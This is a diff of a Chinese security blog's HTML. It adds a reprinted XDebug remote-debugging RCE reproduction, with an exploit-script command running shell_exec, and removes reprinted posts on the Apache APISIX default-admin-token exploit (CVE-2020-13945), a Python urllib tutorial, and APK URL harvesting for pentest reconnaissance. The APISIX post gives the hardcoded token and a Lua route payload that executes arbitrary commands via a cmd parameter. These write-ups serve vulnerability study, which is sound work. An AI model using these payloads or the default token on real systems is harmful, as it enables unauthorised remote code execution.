+        Dec 7, 2023
+    </time>
+    <section class="content">
+        <h1><span id="xdebug-远程调试漏洞代码执行">XDebug 远程调试漏洞（代码执行）</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://joker-vip.github.io/2021/12/06/XDebug%20%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89/">joker0xxx3</a> 并作补充</p>
+</blockquote>
+<h2><span id="简介">简介</span></h2><blockquote>
+<p>XDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置<code>remote_connect_back = 1</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_connect_back = <span class="number">1</span></span><br><span class="line">xdebug.remote_enable = <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>这个配置下，我们访问<code>http://target/index.php?XDEBUG_SESSION_START=phpstorm</code>，目标服务器的XDebug将会连接访问者的IP（或<code>X-Forwarded-For</code>头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。</p>
+<p>更多说明可参考：</p>
+<ul>
+<li>[[<a target="_blank" rel="noopener" href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface/]]">https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface\]]</a>(<a target="_blank" rel="noopener" href="https://ricterz.me/posts/Xdebug%3A">https://ricterz.me/posts/Xdebug%3A</a> A Tiny Attack Surface])(<a target="_blank" rel="noopener" href="https://ricterz.me/posts/Xdebug%3A">https://ricterz.me/posts/Xdebug%3A</a> A Tiny Attack Surface)</li>
+<li><a target="_blank" rel="noopener" href="https://xdebug.org/">https://xdebug.org</a></li>
+</ul>
+</blockquote>
+<h2><span id="漏洞利用">漏洞利用</span></h2><blockquote>
+<p>启动完成后，访问<code>http://192.168.44.132:8080/</code>即可发现主页是一个简单的phpinfo，在其中可以找到xdebug的配置，可见开启了远程调试。</p>
+<p><img src="/2023/12/07/XDebug-RCE/1.png" alt="image"></p>
+<p>因为需要使用dbgp协议与目标服务器通信，所以无法用http协议复现漏洞。</p>
+<p>我编写了一个<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py">漏洞复现脚本</a>，指定目标web地址、待执行的php代码即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 要求用python3并安装requests库</span></span><br><span class="line">python3 exp.py -t http://192.168.44.132:8080/index.php -c <span class="string">&#x27;shell_exec(&#x27;</span><span class="built_in">id</span><span class="string">&#x27;);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/07/XDebug-RCE/2.png" alt="image"></p>
+<p><strong>重要说明：因为该通信是一个反向连接的过程，exp.py启动后其实是会监听本地的9000端口（可通过-l参数指定）并等待XDebug前来连接，所以执行该脚本的服务器必须有外网IP（或者与目标服务器处于同一内网）。</strong></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XDebug/" rel="tag">XDebug</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2023/12/07/OS-Command-Injection/">
                 PortSwigger Academy | OS command injection 操作系统命令注入
             </a>
@@ -896,158 +1176,6 @@ Newline (0x0a or \n)
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/12/06/CVE-2020-13945-Apache-APISIX/">
-                Apache APISIX 默认密钥漏洞（CVE-2020-13945）
-            </a>
-        </h2>
-    
-    <time>
-        Dec 6, 2023
-    </time>
-    <section class="content">
-        <h1><span id="apache-apisix-默认密钥漏洞cve-2020-13945">Apache APISIX 默认密钥漏洞（CVE-2020-13945）</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/horistttt/article/details/124344871">horisMMM</a> 并作补充</p>
-</blockquote>
-<h2><span id="apisix简介">APISIX简介</span></h2><blockquote>
-<p>官方一句话介绍：Apache APISIX是一个高性能API网关。</p>
-<p>API网关又是什么？</p>
-<p>百度：API网关，软件术语，两个相互独立的局域网之间通过路由器进行通信，中间的路由被称之为网关。</p>
-<p>任何一个应用系统如果需要被其他系统调用，就需要暴露 API，这些 API 代表着一个一个的功能点。</p>
-<p>如果两个系统中间通信，在系统之间加上一个中介者协助 API 的调用，这个中介者就是 API 网关。</p>
-<p>那意思就是Apisix是两个系统的一个中介，可以使用这个中间管理系统API。</p>
-</blockquote>
-<h2><span id="存在漏洞">存在漏洞</span></h2><blockquote>
-<p>在用户未指定管理员Token或使用了默认配置文件的情况下，Apache APISIX将使用默认的管理员Token edd1c9f034335f136f87ad84b625c8f1，攻击者利用这个Token可以访问到管理员接口，进而通过script参数来插入任意LUA脚本并执行。</p>
-<p>意思就是有一个默认的Token，可以直接得到管理员权限，并插入攻击脚本。</p>
-</blockquote>
-<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
-<p>docker-compose up -d 搭建环境</p>
-<p>docker ps 查看端口为9080</p>
-<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/1.png" alt="image"></p>
-<p>访问 127.0.0.1&#x2F;asixpix&#x2F;admin&#x2F;routes,显示token不正确</p>
-<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/2.png" alt="image"></p>
-<p>抓这个包，把方法改为POST，加上X-API-KEY: edd1c9f034335f136f87ad84b625c8f1，加上payload</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;uri&quot;: &quot;/attack&quot;,</span><br><span class="line">&quot;script&quot;: &quot;local _M = &#123;&#125; \n function _M.access(conf, ctx) \n local os = require(&#x27;os&#x27;)\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, &#x27;r&#x27;))\n local s = assert(f:read(&#x27;*a&#x27;))\n ngx.say(s)\n f:close()  \n end \nreturn _M&quot;,</span><br><span class="line">    &quot;upstream&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;roundrobin&quot;,</span><br><span class="line">        &quot;nodes&quot;: &#123;</span><br><span class="line">            &quot;example.com:80&quot;: 1</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/3.png" alt="image"></p>
-<p>然后，我们访问刚才添加的router，就可以通过cmd参数执行任意命令：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9080/attack?cmd=id</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/4.png" alt="image"></p>
-</blockquote>
-<h2><span id="payload分析">payload分析</span></h2><blockquote>
-<p>查看官方文档，观察创建路由的方法</p>
-<p><a target="_blank" rel="noopener" href="https://apisix.apache.org/zh/docs/apisix/getting-started/">https://apisix.apache.org/zh/docs/apisix/getting-started/</a></p>
-<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/5.png" alt="image"></p>
-<p>与payload对比，发现payload格式与官方创建路由一致，只是利用script插入了一段lua恶意脚本。</p>
-<p>在 Apache APISIX 中，我们在 Route 实体中新增了 script 执行逻辑，可用于接收 Dashboard 生成的 Lua 函数并执行，它支持调用已有插件以复用代码。另外，它也作用于 HTTP 请求的生命周期中的各个阶段，如 access、header_filer、body_filter 等，系统会在相应阶段自动执行 script 函数对应阶段代码<br><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/6.png" alt="image"></p>
-<p>接下来对lua脚本进行分析,\n是换行</p>
-<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> _M = &#123;&#125; \n <span class="function"><span class="keyword">function</span> <span class="title">_M.access</span><span class="params">(conf, ctx)</span></span>//在access阶段进行处理，检查如果达到的不健康次数超过了配置的最大次数，则就被<span class="keyword">break</span>掉。这里没找到看得懂的资料。</span><br><span class="line"><span class="keyword">local</span> <span class="built_in">os</span> = <span class="built_in">require</span>(<span class="string">&#x27;os&#x27;</span>)//加载<span class="built_in">os</span>模块，用于进行文件操作</span><br><span class="line"><span class="keyword">local</span> args = <span class="built_in">assert</span>(ngx.req.get_uri_args()) //<span class="built_in">assert</span>()是断言，类似于try(),这里是获取uri中给的参数。</span><br><span class="line"><span class="keyword">local</span> f = <span class="built_in">assert</span>(<span class="built_in">io</span>.<span class="built_in">popen</span>(args.cmd, <span class="string">&#x27;r&#x27;</span>))//<span class="built_in">io</span>.<span class="built_in">popen</span>()用于执行系统命令,<span class="string">&#x27;r&#x27;</span>是模式</span><br><span class="line"><span class="keyword">local</span> s = <span class="built_in">assert</span>(f:<span class="built_in">read</span>(<span class="string">&#x27;*a&#x27;</span>))//读取全部内容</span><br><span class="line">ngx.say(s)//输出，还有一种方法是ngx.<span class="built_in">print</span>(),但两者有区别</span><br><span class="line">f:<span class="built_in">close</span>()</span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"><span class="keyword">return</span> _M</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>function _M.access(conf, ctx)</strong></p>
-<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/7.png" alt="image"></p>
-<p><strong>assert()</strong></p>
-<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/8.png" alt="image"></p>
-<p><strong>read(‘a’)</strong></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u013625451/article/details/78879739">https://blog.csdn.net/u013625451/article/details/78879739</a></p>
-<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/9.png" alt="image"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/11/08/urllib-HTTPResponse/">
-                urllib库进行网络请求后返回的HTTPResponse对象的用法总结
-            </a>
-        </h2>
-    
-    <time>
-        Nov 8, 2023
-    </time>
-    <section class="content">
-        <h1><span id="urllib库进行网络请求后返回的httpresponse对象的用法总结">urllib库进行网络请求后返回的HTTPResponse对象的用法总结</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/topleeyap/article/details/78845946">「已注销」</a> 并作补充</p>
-</blockquote>
-<blockquote>
-<p>不管是使用urllib.request.urlopen()方法，还是使用opener.open()方法，都返回同样类型的HTTPResponse对象，用法总结如下:</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> response</span><br><span class="line"> </span><br><span class="line">URL=<span class="string">&quot;http://www.baidu.com/&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 构造请求头信息</span></span><br><span class="line"><span class="comment"># 反反爬虫:设置User-Agent</span></span><br><span class="line">request_headers=&#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 构造请求对象,并添加请求头</span></span><br><span class="line">req=request.Request(URL,headers=request_headers)</span><br><span class="line"><span class="comment"># 发起请求</span></span><br><span class="line">resp=request.urlopen(req)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(resp))   <span class="comment"># &lt;class &#x27;http.client.HTTPResponse&#x27;&gt;</span></span><br><span class="line"><span class="comment"># 获取HTTP协议版本号(10 for HTTP/1.0, 11 for HTTP/1.1)</span></span><br><span class="line"><span class="built_in">print</span>(resp.version)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取响应码</span></span><br><span class="line"><span class="built_in">print</span>(resp.status)</span><br><span class="line"><span class="built_in">print</span>(resp.getcode())</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取响应描述字符串</span></span><br><span class="line"><span class="built_in">print</span>(resp.reason)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取实际请求的页面url(防止重定向用)</span></span><br><span class="line"><span class="built_in">print</span>(resp.geturl())</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取特定响应头信息</span></span><br><span class="line"><span class="built_in">print</span>(resp.getheader(name=<span class="string">&quot;Content-Type&quot;</span>))</span><br><span class="line"><span class="comment"># 获取响应头信息,返回二元元组列表</span></span><br><span class="line"><span class="built_in">print</span>(resp.getheaders())</span><br><span class="line"><span class="comment"># 获取响应头信息,返回字符串</span></span><br><span class="line"><span class="built_in">print</span>(resp.info())</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 读取响应体</span></span><br><span class="line"><span class="built_in">print</span>(resp.readline().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(resp.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/HTTP/" rel="tag">HTTP</a><a class="tag-none-link" href="/tags/Python/" rel="tag">Python</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/11/08/Apktool-URL/">
-                提取APK中的URL地址
-            </a>
-        </h2>
-    
-    <time>
-        Nov 8, 2023
-    </time>
-    <section class="content">
-        <h1><span id="提取apk中的url地址">提取APK中的URL地址</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/Aaron_Miller/article/details/108759583">風月长情</a> 并作补充</p>
-</blockquote>
-<h2><span id="一-目的">一、目的</span></h2><blockquote>
-<p>客户端渗透测试前期信息收集过程中可以在APK中检索开发过程中没有删掉的URL地址，在这些地址中可能会发现后台、搜索引擎、子域名查找不到的一些资源。</p>
-</blockquote>
-<h2><span id="二-操作">二、操作</span></h2><blockquote>
-<p>反编译APK文件<br><code>apktool d &lt;xxx.apk&gt;</code><br>将反编译的文件zip打包发送到linux系统中<br><img src="/2023/11/08/Apktool-URL/1.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>使用grep命令进行URL正则匹配<br>通过grep正则匹配包下边所有文件的uri地址，然后排序，删除重复行，最后重定向到文件中<br><code>grep -ohr -E &quot;https?://[a-zA-Z0-9\.\/_&amp;=@$%?~#-]*&quot; /Kevin/com.sogou.map.android.maps/ |sort|uniq &gt;&gt; test.txt</code><br><img src="/2023/11/08/Apktool-URL/2.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>然后在搜索出来的地址中查看是否有敏感地址：<br>比如这个地址就不在我搜索的上千个子域中：<br><img src="/2023/11/08/Apktool-URL/3.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>随便一试直接进入后台，到此文件上传拿shell一个高危漏洞又到手了，香吧~<br><img src="/2023/11/08/Apktool-URL/4.png" alt="image"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Apktool/" rel="tag">Apktool</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
             </div>
         
 
